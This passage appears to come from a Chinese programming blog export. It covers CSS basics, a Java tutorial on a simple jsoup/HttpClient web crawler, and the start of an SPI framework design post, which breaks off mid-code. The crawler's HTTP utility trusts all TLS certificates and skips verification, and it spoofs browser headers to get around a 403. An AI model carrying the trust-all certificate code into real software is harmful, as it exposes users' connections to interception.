小写英文字母The marker is lower-alpha (a, b, c, d, e, 等。) upper-alpha 大写英文字母The marker is upper-alpha (A, B, C, D, E, 等。) lower-greek 小写希腊字母(alpha, beta, gamma, 等。) lower-latin 小写拉丁字母(a, b, c, d, e, 等。) upper-latin 大写拉丁字母(A, B, C, D, E, 等。) hebrew 传统的希伯来编号方式 armenian 传统的亚美尼亚编号方式 georgian 传统的乔治亚编号方式(an, ban, gan, 等。) cjk-ideographic 简单的表意数字 hiragana 标记是：a, i, u, e, o, ka, ki, 等。（日文片假名） katakana 标记是：A, I, U, E, O, KA, KI, 等。（日文片假名） hiragana-iroha 标记是：i, ro, ha, ni, ho, he, to, 等。（日文片假名） katakana-iroha 标记是：I, RO, HA, NI, HO, HE, TO, 等。（日文片假名） list-style-image: 用图片作为列表的前置，如 ( url(‘sqpurple.gif’);) list-style-position: （outside, inside）感觉不出太大的差别 8. box模型 Margin(外边距) - 清除边框外的区域，外边距是透明的。 Border(边框) - 围绕在内边距和内容外的边框。 Padding(内边距) - 清除内容周围的区域，内边距是透明的。 Content(内容) - 盒子的内容，显示文本和图像。 主要是用来控制一个标签和其他标签的位置，比如两个标签之间做间隔区分等，比较有用 padding与margin的区别 a. Margin 外边距主要是标签与周边的距离设置 margin-top:100px; margin-right:50px; margin-bottom:100px; margin-left:50px; b. padding 内边距定义元素边框与元素内容之间的空间 padding-top:25px; padding-bottom:25px; padding-right:50px; padding-left:50px; c. border 边框这个有些时候还是挺有用的，设置一个标签四周的边框，一般可以设置线粗细，样式，颜色等 border-width : 线的粗细 border-style dotted: dotted:定义一个点线边框 dashed: 定义一个虚线边框 solid: 定义实线边框 double: 定义两个边框。 两个边框的宽度和 border-width 的值相同 groove: 定义3D沟槽边框。效果取决于边框的颜色值 ridge: 定义3D脊边框。效果取决于边框的颜色值 inset:定义一个3D的嵌入边框。效果取决于边框的颜色值 outset: 定义一个3D突出边框。 效果取决于边框的颜色值 border-color: 边框的颜色 一个非常有意思的点是，边框支持分别设置上下左右四个线的形式，如只设置一个左右有颜色的 12345&lt;div&gt; &lt;p style=\"border-left-style:dashed; border-left-color:red; border-right-style:solid;\"&gt; 只有左右边框的情况&lt;/p&gt;&lt;/div&gt; d. outline 边缘轮廓outline主要作用在border上，绘制于元素周围的一条线，位于边框边缘的外围，可起到突出元素的作用 outline-color outline-style none dotted: dotted:定义一个点线边框 dashed: 定义一个虚线边框 solid: 定义实线边框 double: 定义两个边框。 两个边框的宽度和 border-width 的值相同 groove: 定义3D沟槽边框。效果取决于边框的颜色值 ridge: 定义3D脊边框。效果取决于边框的颜色值 inset:定义一个3D的嵌入边框。效果取决于边框的颜色值 outset: 定义一个3D突出边框。 效果取决于边框的颜色值 outline-width 从实际体验来讲，这个和border的效果差不多 9. 尺寸这个主要就是用来控制标签的宽高等相关尺寸的属性，常见的设置如下 width: 定宽 height: 定高 min-width: 最小宽 max-width: 最大宽 min-height: 最小高 max-height: 最大高 line-height: 行高 10. 显示控制标签的显示隐藏等 display属性设置一个元素应如何显示 visibility属性指定一个元素应可见还是隐藏 a. displaynone可以隐藏某个元素，且隐藏的元素不会占用任何空间。也就是说，该元素不但被隐藏了，而且该元素原本占用的空间也会从页面布局中消失。 块元素是一个元素，占用了全部宽度，在前后都是换行 内联元素只需要必要的宽度，不强制换行。 1234567891011121314151617181920211. 块级元素(block)特性：总是独占一行，表现为另起一行开始，而且其后的元素也必须另起一行显示;宽度(width)、高度(height)、内边距(padding)和外边距(margin)都可控制;2. 内联元素(inline)特性：和相邻的内联元素在同一行;宽度(width)、高度(height)、内边距的top/bottom(padding-top/padding-bottom)和外边距的top/bottom(margin-top/margin-bottom)都不可改变，就是里面文字或图片的大小;3. 块级元素主要有： address , blockquote , center , dir , div , dl , fieldset , form , h1 , h2 , h3 , h4 , h5 , h6 , hr , isindex , menu , noframes , noscript , ol , p , pre , table , ul , li4. 内联元素主要有：a , abbr , acronym , b , bdo , big , br , cite , code , dfn , em , font , i , img , input , kbd , label , q , s , samp , select , small , span , strike , strong , sub , sup ,textarea , tt , u , var5. 可变元素(根据上下文关系确定该元素是块元素还是内联元素)：applet ,button ,del ,iframe , ins ,map ,object , script b. visibilityhidden可以隐藏某个元素,但隐藏的元素仍需占用与未隐藏之前一样的空间,也就是说，该元素虽然被隐藏了，但仍然会影响布局。 11. 定位 positionposition 属性指定了元素的定位类型。在使用top, bottom, left, right之前，一般需要先确定position属性，明确具体的定位方式 static 默认值，即没有定位，元素出现在正常的流中 静态定位的元素不会受到 top, bottom, left, right影响。 relative 元素的位置相对于浏览器窗口是固定位置 即窗口是滚动的它也不会移动，常用来做悬浮按钮 fixed 相对定位元素的定位是相对其正常位置。 absolute 绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于 如一个测试 1234567891011121314&lt;style&gt;h2{ position:absolute; left:100px; top:150px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;这是一个绝对定位了的标题&lt;/h2&gt;&lt;p&gt;用绝对定位,一个元素可以放在页面上的任何位置。标题下面放置距离左边的页面100 px和距离页面的顶部150 px的元素。.&lt;/p&gt;&lt;/body&gt; 注意 当多个元素在同一个位置时，就会出现重叠的问题，特别是relative这种场景，在网页右下角添加悬浮窗时，经常会出现遮盖的问题，这时可以用 z-index 属性来指定覆盖顺序，越大，则越上面 12. float 浮动CSS 的 Float（浮动），会使元素向左或向右移动，其周围的元素也会重新排列。 往往是用于图像，但它在布局时一样非常有用。 元素的水平方向浮动，意味着元素只能左右移动而不能上下移动。 一个浮动元素会尽量向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。 浮动元素之后的元素将围绕它。 浮动元素之前的元素将不会受到影响。 如果图像是右浮动，下面的文本流将环绕在它左边 如果你把几个浮动的元素放到一起，如果有空间的话，它们将彼此相邻 12345678&lt;!-- 注意多个浮动的图片时，缩小浏览器窗口大小，布局会发生改变 --&gt;.thumbnail { float:left; width:110px; height:90px; margin:5px;} 13. 水平 &amp; 垂直对齐 css实现对齐方式 根据前面学习到的几个属性(text-align, margin, position)等来实现各种标签的对齐方式 text-align: left, right, center 通常是对于文本的对其方式，比如一个标签块内文本是如何对齐的，靠左，靠右还是居中 margin: auto 标签的对齐方式，如希望一个div标签水平居中，就可以这么玩 图片需要居中对齐，采用这种方案 (注意 在img使用时，一般需要指定 display:block;margin:auto，这样才会生效) 一个case如下 1234567&lt;div style=\"width:200px; border: 3px solid blue; padding: 4px\"&gt; &lt;div style=\"width:50%; border:3px solid red; margin: auto; padding: 20px\"&gt; 这是一个测试标签居中对其的示例 &lt;/div&gt;&lt;/div&gt;&lt;br/&gt;&lt;div style=\"width:200px; border: 3px solid blue; padding: 4px\"&gt; &lt;div style=\"width:50%; border:3px solid red; text-align: center; padding: 20px\"&gt; 这是一个测试标签内文本居中对齐的示例 &lt;/div&gt;&lt;/div&gt; II. CSS3高阶用法1. 边框 border前面介绍了边框的设置，主要还是线条类型，粗细以及颜色，现在则可以扩展，设置圆角、阴影，边框图 border-radius: 2px (四周圆角) 一个值： 四个圆角值相同 两个值: 第一个值为左上角与右下角，第二个值为右上角与左下角 三个值: 第一个值为左上角, 第二个值为右上角和左下角，第三个值为右下角 四个值: 第一个值为左上角，第二个值为右上角，第三个值为右下角，第四个值为左下角。 border-image: url(border.png) 30 30 round; （边框由图来替代） border-image-source 用于指定要用于绘制边框的图像的位置 border-image-slice 图像边界向内偏移 border-image-width 图像边界的宽度 border-image-outset 用于指定在边框外部绘制 border-image-area 的量 border-image-repeat 设置图像边界是否应重复（repeat）、拉伸（stretch）或铺满（round）。 box-shadow: 10px 10px 2px #bbbbbb (设置阴影) h-shadow 必需的。水平阴影的位置。允许负值 v-shadow 必需的。垂直阴影的位置。允许负值 blur 可选。模糊距离 spread 可选。阴影的大小 color 可选。阴影的颜色 一个实例，捷足 box-shadow 给图片加上一个白色背景边框 1234567891011121314151617181920212223242526272829303132333435&lt;style&gt;#boxshadow { position: relative; &lt;!-- 添加边框阴影 --&gt; -moz-box-shadow: 1px 2px 4px rgba(0, 0, 0,0.5); -webkit-box-shadow: 1px 2px 4px rgba(0, 0, 0, .5); box-shadow: 1px 2px 4px rgba(0, 0, 0, .5); padding: 10px; background: white;}/* Make the image fit the box */#boxshadow img { width: 100%; border: 1px solid #8a4419; border-style: inset;}#boxshadow::after { content: ''; position: absolute; z-index: -1; /* hide shadow behind image */ -webkit-box-shadow: 0 15px 20px rgba(0, 0, 0, 0.3); -moz-box-shadow: 0 15px 20px rgba(0, 0, 0, 0.3); box-shadow: 0 15px 20px rgba(0, 0, 0, 0.3); width: 70%; left: 15%; /* one half of the remaining 30% */ height: 20%; bottom: 0;}&lt;/style&gt;&lt;div id=\"boxshadow\"&gt; &lt;img src=\"https://raw.githubusercontent.com/liuyueyi/Source/master/img/info/blogInfoV2.png\" alt=\"Norway\"&gt;&lt;/div&gt; 2. 文本除了前面说的文本颜色，大小，decorate, transform等之外，这里额外的加了一些特性 a. text-shadow5px 5px 5px #FF0000; 阴影，参数说明同 box-shadow b. text-overflow文字逸出时，怎么办（ 配合overflow:hidden，将逸出的隐藏掉） clip： 修剪文本 ellipsis: 用省略号代替逸出的文本 string: 用给出的字符串代替 一个实例： 123456789101112&lt;style&gt;div.ov { width: 120px; white-space:nowrap; border: 1px solid black; overflow:hidden; text-overflow:ellipsis}&lt;/style&gt;&lt;div class=\"ov\"&gt; 这是一个会移除的文本&lt;/div&gt; c. word-wrap &amp; word-breakword-wrap 文本太长时，换行的策略 normal 只在允许的断字点换行 break-word 在长单词或 URL 地址内部进行换行。 还有一个主要针对英文单词的换行策略 word-break normal 使用浏览器默认的换行规则。 break-all 允许在单词内换行。 keep-all 只能在半角空格或连字符处换行。 d. 字体@Font-face 指定特殊的字体 一般的使用姿势如下: 1234567891011121314&lt;style&gt; @font-face{ &lt;!-- 字体命名 --&gt; font-family: myFirstFont; &lt;!-- 指定字体文件路径 --&gt; src: url(sansation_light.woff);} div{ font-family:myFirstFont;}&lt;/style&gt; 3. 动画a. transform实现转换，最常见的就是旋转一定角度了 translate(x, y): 根据左(X轴)和顶部(Y轴)位置给定的参数，从当前元素位置移动 rotate(30deg): 表示顺时针渲染30° scale(2,3): 表示x轴扩大2倍，y抽扩大3倍 skew(30deg,20deg): X轴(水平方向)倾斜30°；Y轴(垂直方向)倾斜20° matrix 方法有六个参数，包含旋转，缩放，移动（平移）和倾斜功 b. transition过渡，配合上面的transform可以实现旋转or放大的动画效果 如一个case，在鼠标放上去时，放大且旋转360° 12345678910111213141516171819&lt;style&gt; div { width: 100px; height: 100px; background: red; -webkit-transition: width 2s, height 2s, -webkit-transform 2s; /* For Safari 3.1 to 6.0 */ transition: width 2s, height 2s, transform 2s, background 2s;}div:hover { width: 200px; height: 200px; background:blue; -webkit-transform: rotate(360deg); /* Chrome, Safari, Opera */ transform: rotate(360deg);}&lt;/style&gt;&lt;div&gt;鼠标移动到 div 元素上，查看过渡效果。&lt;/div&gt; c. 动画通过 @keyframes 来创建动画的效果，通过 animation 来使用动画 一个实例 12345678910111213141516171819202122232425262728293031&lt;style&gt; div{ width:100px; height:100px; background:red; position:relative; animation:myfirst 5s; -webkit-animation:myfirst 5s; /* Safari and Chrome */}@keyframes myfirst{ 0% {background:red; left:0px; top:0px;} 25% {background:yellow; left:200px; top:0px;} 50% {background:blue; left:200px; top:200px;} 75% {background:green; left:0px; top:200px;} 100% {background:red; left:0px; top:0px;}}@-webkit-keyframes myfirst /* Safari and Chrome */{ 0% {background:red; left:0px; top:0px;} 25% {background:yellow; left:200px; top:0px;} 50% {background:blue; left:200px; top:200px;} 75% {background:green; left:0px; top:200px;} 100% {background:red; left:0px; top:0px;}}&lt;/style&gt;&lt;div&gt;哈哈&lt;/div&gt; 4. 图片支持图片圆角设置 border-radius: 8px; 自由缩放： max-width: 100%; height: auto; filter：滤镜 详细参数: filter参数 III. 其他个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/01/Css学习手册之基本篇/"},{"title":"Java 动手写爬虫: 一、实现一个最简单爬虫","text":"第一篇实现一个最简单爬虫 准备写个爬虫， 可以怎么搞？ I. 使用场景先定义一个最简单的使用场景，给你一个url，把这个url中指定的内容爬下来，然后停止 一个待爬去的网址（有个地方指定爬的网址） 如何获取指定的内容（可以配置规则来获取指定的内容） II. 设计 &amp; 实现1. 基本数据结构CrawlMeta.java 一个配置项，包含塞入的 url 和 获取规则 123456789101112131415161718192021222324252627/** * Created by yihui on 2017/6/27. */@ToStringpublic class CrawlMeta { /** * 待爬去的网址 */ @Getter @Setter private String url; /** * 获取指定内容的规则, 因为一个网页中，你可能获取多个不同的内容， 所以放在集合中 */ @Setter private Set&lt;String&gt; selectorRules; // 这么做的目的就是为了防止NPE, 也就是说支持不指定选择规则 public Set&lt;String&gt; getSelectorRules() { return selectorRules != null ? selectorRules : new HashSet&lt;&gt;(); }} CrawlResult 抓取的结果，除了根据匹配的规则获取的结果之外，把整个html的数据也保存下来，这样实际使用者就可以更灵活的重新定义获取规则 12345678910111213141516171819202122232425import org.jsoup.nodes.Document;@Getter@Setter@ToStringpublic class CrawlResult { /** * 爬取的网址 */ private String url; /** * 爬取的网址对应的 DOC 结构 */ private Document htmlDoc; /** * 选择的结果，key为选择规则，value为根据规则匹配的结果 */ private Map&lt;String, List&lt;String&gt;&gt; result;} 说明：这里采用jsoup来解析html 2. 爬取任务 爬取网页的具体逻辑就放在这里了 一个爬取的任务 CrawlJob，爬虫嘛，正常来讲都会塞到一个线程中去执行，虽然我们是第一篇，也不至于low到直接放到主线程去做 面向接口编程，所以我们定义了一个 IJob 的接口 IJob.java这里定义了两个方法，在job执行之前和之后的回调，加上主要某些逻辑可以放在这里来做（如打日志，耗时统计等），将辅助的代码从爬取的代码中抽取，使代码结构更整洁 12345678910111213public interface IJob extends Runnable { /** * 在job执行之前回调的方法 */ void beforeRun(); /** * 在job执行完毕之后回调的方法 */ void afterRun();} AbstractJob因为IJob 多了两个方法，所以就衍生了这个抽象类，不然每个具体的实现都得去实现这两个方法，有点蛋疼 然后就是借用了一丝模板设计模式的思路，把run方法也实现了，单独拎了一个doFetchPage方法给子类来实现，具体的抓取网页的逻辑 1234567891011121314151617181920212223242526272829303132public abstract class AbstractJob implements IJob { public void beforeRun() { } public void afterRun() { } @Override public void run() { this.beforeRun(); try { this.doFetchPage(); } catch (Exception e) { e.printStackTrace(); } this.afterRun(); } /** * 具体的抓去网页的方法， 需要子类来补全实现逻辑 * * @throws Exception */ public abstract void doFetchPage() throws Exception;} SimpleCrawlJob一个最简单的实现类，直接利用了JDK的URL方法来抓去网页，然后利用jsoup进行html结构解析，这个实现中有较多的硬编码，先看着，下面就着手第一步优化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990/** * 最简单的一个爬虫任务 * &lt;p&gt; * Created by yihui on 2017/6/27. */@Getter@Setterpublic class SimpleCrawlJob extends AbstractJob { /** * 配置项信息 */ private CrawlMeta crawlMeta; /** * 存储爬取的结果 */ private CrawlResult crawlResult; /** * 执行抓取网页 */ public void doFetchPage() throws Exception { URL url = new URL(crawlMeta.getUrl()); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); BufferedReader in = null; StringBuilder result = new StringBuilder(); try { // 设置通用的请求属性 connection.setRequestProperty(\"accept\", \"*/*\"); connection.setRequestProperty(\"connection\", \"Keep-Alive\"); connection.setRequestProperty(\"user-agent\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\"); // 建立实际的连接 connection.connect(); Map&lt;String, List&lt;String&gt;&gt; map = connection.getHeaderFields(); //遍历所有的响应头字段 for (String key : map.keySet()) { System.out.println(key + \"---&gt;\" + map.get(key)); } // 定义 BufferedReader输入流来读取URL的响应 in = new BufferedReader(new InputStreamReader( connection.getInputStream())); String line; while ((line = in.readLine()) != null) { result.append(line); } } finally { // 使用finally块来关闭输入流 try { if (in != null) { in.close(); } } catch (Exception e2) { e2.printStackTrace(); } } doParse(result.toString()); } private void doParse(String html) { Document doc = Jsoup.parse(html); Map&lt;String, List&lt;String&gt;&gt; map = new HashMap&lt;&gt;(crawlMeta.getSelectorRules().size()); for (String rule: crawlMeta.getSelectorRules()) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (Element element: doc.select(rule)) { list.add(element.text()); } map.put(rule, list); } this.crawlResult = new CrawlResult(); this.crawlResult.setHtmlDoc(doc); this.crawlResult.setUrl(crawlMeta.getUrl()); this.crawlResult.setResult(map); }} 4. 测试 上面一个最简单的爬虫就完成了，就需要拉出来看看，是否可以正常的工作了 就拿自己的博客作为测试网址，目标是获取 title + content，所以测试代码如下 12345678910111213141516171819202122232425262728/** * 测试我们写的最简单的一个爬虫, * * 目标是爬取一篇博客 */@Testpublic void testFetch() throws InterruptedException { String url = \"https://my.oschina.net/u/566591/blog/1031575\"; Set&lt;String&gt; selectRule = new HashSet&lt;&gt;(); selectRule.add(\"div[class=title]\"); // 博客标题 selectRule.add(\"div[class=blog-body]\"); // 博客正文 CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); // 设置爬取的网址 crawlMeta.setSelectorRules(selectRule); // 设置抓去的内容 SimpleCrawlJob job = new SimpleCrawlJob(); job.setCrawlMeta(crawlMeta); Thread thread = new Thread(job, \"crawler-test\"); thread.start(); thread.join(); // 确保线程执行完毕 CrawlResult result = job.getCrawlResult(); System.out.println(result);} 代码演示示意图如下 从返回的结果可以看出，抓取到的title中包含了博客标题 + 作着，主要的解析是使用的 jsoup，所以这些抓去的规则可以参考jsoup的使用方式 III. 优化 上面完成之后，有个地方看着就不太舒服，doFetchPage 方法中的抓去网页，有不少的硬编码，而且那么一大串看着也不太利索, 所以考虑加一个配置项，用于记录HTTP相关的参数 可以用更成熟的http框架来取代jdk的访问方式，维护和使用更加简单 仅针对这个最简单的爬虫，我们开始着手上面的两个优化点 1. 改用 HttpClient 来执行网络请求使用httpClient，重新改上面的获取网页代码(暂不考虑配置项的情况), 对比之后发现代码会简洁很多 12345678910111213141516/** * 执行抓取网页 */public void doFetchPage() throws Exception { HttpClient httpClient = HttpClients.createDefault(); HttpGet httpGet = new HttpGet(crawlMeta.getUrl()); HttpResponse response = httpClient.execute(httpGet); String res = EntityUtils.toString(response.getEntity()); if (response.getStatusLine().getStatusCode() == 200) { // 请求成功 doParse(res); } else { this.crawlResult = new CrawlResult(); this.crawlResult.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); this.crawlResult.setUrl(crawlMeta.getUrl()); }} 这里加了一个对返回的code进行判断，兼容了一把访问不到数据的情况，对应的返回结果中，新加了一个表示状态的对象 CrawlResult 123456789101112131415private Status status;public void setStatus(int code, String msg) { this.status = new Status(code, msg);}@Getter@Setter@ToString@AllArgsConstructorstatic class Status { private int code; private String msg;} 然后再进行测试，结果发现返回状态为 403, 主要是没有设置一些必要的请求参数，被拦截了，手动塞几个参数再试则ok 1234HttpGet httpGet = new HttpGet(crawlMeta.getUrl());httpGet.addHeader(\"accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\");httpGet.addHeader(\"connection\", \"Keep-Alive\");httpGet.addHeader(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\"); 2. http配置项 显然每次都这么手动塞入参数是不可选的，我们有必要透出一个接口，由用户自己来指定一些请求和返回参数 首先我们可以确认下都有些什么样的配置项 请求方法： GET, POST, OPTIONS, DELET … RequestHeader: Accept Cookie Host Referer User-Agent Accept-Encoding Accept-Language … （直接打开一个网页，看请求的hedaers即可） 请求参数 ResponseHeader: 这个我们没法设置，但是我们可以设置网页的编码（这个来fix中文乱码比较使用） 是否走https（这个暂时可以不考虑，后面讨论） 新增一个配置文件，配置参数主要为 请求方法 请求参数 请求头 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@ToStringpublic class CrawlHttpConf { private static Map&lt;String, String&gt; DEFAULT_HEADERS; static { DEFAULT_HEADERS = new HashMap&lt;&gt;(); DEFAULT_HEADERS.put(\"accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\"); DEFAULT_HEADERS.put(\"connection\", \"Keep-Alive\"); DEFAULT_HEADERS.put(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\"); } public enum HttpMethod { GET, POST, OPTIONS, PUT; } @Getter @Setter private HttpMethod method = HttpMethod.GET; /** * 请求头 */ @Setter private Map&lt;String, String&gt; requestHeaders; /** * 请求参数 */ @Setter private Map&lt;String, Object&gt; requestParams; public Map&lt;String, String&gt; getRequestHeaders() { return requestHeaders == null ? DEFAULT_HEADERS : requestHeaders; } public Map&lt;String, Object&gt; getRequestParams() { return requestParams == null ? Collections.emptyMap() : requestParams; }} 新建一个 HttpUtils 工具类，来具体的执行Http请求, 下面我们暂先实现Get/Post两个请求方式，后续可以再这里进行扩展和优化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class HttpUtils { public static HttpResponse request(CrawlMeta crawlMeta, CrawlHttpConf httpConf) throws Exception { switch (httpConf.getMethod()) { case GET: return doGet(crawlMeta, httpConf); case POST: return doPost(crawlMeta, httpConf); default: return null; } } private static HttpResponse doGet(CrawlMeta crawlMeta, CrawlHttpConf httpConf) throws Exception {// HttpClient httpClient = HttpClients.createDefault(); SSLContextBuilder builder = new SSLContextBuilder();// 全部信任 不做身份鉴定 builder.loadTrustMaterial(null, (x509Certificates, s) -&gt; true); HttpClient httpClient = HttpClientBuilder.create().setSslcontext(builder.build()).build(); // 设置请求参数 StringBuilder param = new StringBuilder(crawlMeta.getUrl()).append(\"?\"); for (Map.Entry&lt;String, Object&gt; entry : httpConf.getRequestParams().entrySet()) { param.append(entry.getKey()) .append(\"=\") .append(entry.getValue()) .append(\"&amp;\"); } HttpGet httpGet = new HttpGet(param.substring(0, param.length() - 1)); // 过滤掉最后一个无效字符 // 设置请求头 for (Map.Entry&lt;String, String&gt; head : httpConf.getRequestHeaders().entrySet()) { httpGet.addHeader(head.getKey(), head.getValue()); } // 执行网络请求 return httpClient.execute(httpGet); } private static HttpResponse doPost(CrawlMeta crawlMeta, CrawlHttpConf httpConf) throws Exception {// HttpClient httpClient = HttpClients.createDefault(); SSLContextBuilder builder = new SSLContextBuilder();// 全部信任 不做身份鉴定 builder.loadTrustMaterial(null, (x509Certificates, s) -&gt; true); HttpClient httpClient = HttpClientBuilder.create().setSslcontext(builder.build()).build(); HttpPost httpPost = new HttpPost(crawlMeta.getUrl()); // 建立一个NameValuePair数组，用于存储欲传送的参数 List&lt;NameValuePair&gt; params = new ArrayList&lt;&gt;(); for (Map.Entry&lt;String, Object&gt; param : httpConf.getRequestParams().entrySet()) { params.add(new BasicNameValuePair(param.getKey(), param.getValue().toString())); } httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8)); // 设置请求头 for (Map.Entry&lt;String, String&gt; head : httpConf.getRequestHeaders().entrySet()) { httpPost.addHeader(head.getKey(), head.getValue()); } return httpClient.execute(httpPost); }} 然后我们的 doFetchPage 方法将简洁很多 1234567891011121314/*** 执行抓取网页*/public void doFetchPage() throws Exception { HttpResponse response = HttpUtils.request(crawlMeta, httpConf); String res = EntityUtils.toString(response.getEntity()); if (response.getStatusLine().getStatusCode() == 200) { // 请求成功 doParse(res); } else { this.crawlResult = new CrawlResult(); this.crawlResult.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); this.crawlResult.setUrl(crawlMeta.getUrl()); }} 下一步上面我们实现的是一个最简陋，最基础的东西了，但是这个基本上又算是满足了核心的功能点，但距离一个真正的爬虫框架还差那些呢 ？ 另一个核心的就是： 爬了一个网址之后，解析这个网址中的链接，继续爬！！！ 下一篇则将在本此的基础上，考虑如何实现上面这个功能点；写这个博客的思路，将是先做一个实现需求场景的东西出来，，可能在开始实现时，很多东西都比较挫，兼容性扩展性易用性啥的都不怎么样，计划是在完成基本的需求点之后，然后再着手去优化看不顺眼的地方 坚持，希望可以持之以恒，完善这个东西 IV. 其他源码项目地址: https://github.com/liuyueyi/quick-crawler 上面的分了两步，均可以在对应的tag中找到响应的代码，主要代码都在core模块下 第一步对应的tag为：v0.001 优化后对应的tag为：v0.002 相关博文Quick-Crawel爬虫系列博文 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/06/27/Java-动手写爬虫-一、实现一个最简单爬虫/"},{"title":"2. SPI框架实现之旅二：整体设计","text":"整体设计 上一篇简单的说了一下spi相关的东西， 接下来我们准备开动，本篇博文主要集中在一些术语，使用规范的约定和使用方式 设计思路下图围绕 SpiLoader 为中心，描述了三个主要的流程： load所有的spi实现 初始化选择器 selector 获取spi实现类 （or一个实现类代理） 基础类说明 主要介绍一下框架中涉及到的接口和注解，并指出需要注意的点 1. Selector 选择器 为了最大程度的支持业务方对spi实现类的选择，我们定义了一个选择器的概念，用于获取spi实现类 接口定义如下:123public interface ISelector&lt;T&gt; { &lt;K&gt; K selector(Map&lt;String, SpiImplWrapper&lt;K&gt;&gt; map, T conf) throws NoSpiMatchException;} 结合上面的接口定义，我们可以考虑下，选择器应该如何工作？ 根据传入的条件，从所有的实现类中，找到一个最匹配的实现类返回 如果查不到，则抛一个异常NoSpiMatchException出去 所以传入的参数会是两个， 一个是所有的实现类列表map（至于上面为什么用map，后续分析），一个是用于判断的输入条件conf 框架中会提供两种基本的选择器实现， DefaultSelector ， 对每个实现类赋予唯一的name，默认选择器则表示根据name来查找实现类 ParamsSelector， 在实现类上加上 @SpiConf 注解，定义其中的 params，当传入的参数(conf)， 能完全匹配定义的params，表示这个实现类就是你所需要的 自定义实现自定义实现比较简单，实现上面的接口即可 2. Spi 注解 要求所有的spi接口，都必须有这个注解； 定义如下主要是有一个参数，用于指定是选择器类型，定义spi接口的默认选择器， 123456@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface Spi { Class&lt;? extends ISelector&gt; selector() default DefaultSelector.class;} 说明在上一篇《SPI框架实现之旅一》中，使用jdk的spi方式中，并没有使用注解依然可以正常工作，我们这里定义这个注解且要求必需有，出于下面几个考虑 醒目，告诉开发者，这个接口是声明的spi接口， 使用的时候注意下 加入选择器参数，方便用户扩展自己的选择方式 3. SpiAdaptive 注解 对需要自适应的场景，为了满足一个spi接口，应用多重不同的选择器场景，可以加上这个注解；如果不加这个注解，则表示采用默认的选择器来自适应 接口说明1234567891011/** * SPI 自适应注解, 表示该方法会用到spi实现 * &lt;p/&gt; * Created by yihui on 2017/5/24. */@Documented@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.METHOD})public @interface SpiAdaptive { Class&lt;? extends ISelector&gt; selector() default DefaultSelector.class;} 说明这个注解内容和 @Spi 基本上一模一样，唯一的区别是一个放在类上，一个放在方法上，那么为什么这么考虑？ @Spi 注解放在类上，更多的表名这个接口是我们定义的一个SPI接口，但是使用方式可以有两种（静态 + 动态确认） @SpiAdaptive 只能在自适应的场景下使用，用于额外指定spi接口中某个方法的选择器 （如果一个spi接口全部只需要一个选择器即可，那么可以不使用这个注解） 如下面的这个例子，print方法和 echo方法其实是等价的，都是采用 DefaultSelector 来确认具体的实现类；而 write 和 pp 方法则是采用 ParamsSelector 选择器; 1234567891011121314151617181920/** * Created by yihui on 2017/5/25. */@Spipublic interface ICode { void print(String name, String contet); @SpiAdaptive void echo(String name, String content); @SpiAdaptive(selector = ParamsSelector.class) void write(Context context, String content); @SpiAdaptive(selector = ParamsSelector.class) void pp(Context context, String content);} 4. SpiConf 注解 这个主键主要是用在实现类上（或实现类的方法上），里面存储一些选择条件，通常是和Selector搭配使用 定义如下定义了三个字段: name 唯一标识，用于 DefaultSelector； params 参数条件， 用于 ParamsSelector； order : 优先级， 主要是为了解决多个实现类都满足选择条件时， 应该选择哪一个 （谈到这里就有个想法， 通过一个参数，来选择是否让满足条件的全部返回） 123456789101112131415161718192021222324252627282930@Documented@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.TYPE, ElementType.METHOD})public @interface SpiConf { /** * 唯一标识 * * @return */ String name() default \"\"; /** * 参数过滤, 单独一个元素,表示参数必须包含; 用英文分号,左边为参数名,右边为参数值,表示参数的值必须是右边的 * &lt;p/&gt; * 形如 {\"a\", \"a:12\", \"b:TAG\"} * * @return */ String[] params() default {}; /** * 排序, 越小优先级越高 * * @return */ int order() default -1;} 说明SpiConf 注解可以修饰类，也可以修饰方法，因此当一个实现类中，类和方法都有这个注解时， 怎么处理 ？ 以下面的这个测试类进行说明 1234567891011121314151617181920212223242526272829303132333435/** * Created by yihui on 2017/5/25. */@SpiConf(params = \"code\", order = 1)public class ConsoleCode implements ICode { @Override public void print(String name, String contet) { System.out.println(\"console print:---&gt;\" + contet); } /** * 显示指定了name, 因此可以直接通过 consoleEcho 来确定调用本实现方法 * @param name * @param content */ @Override 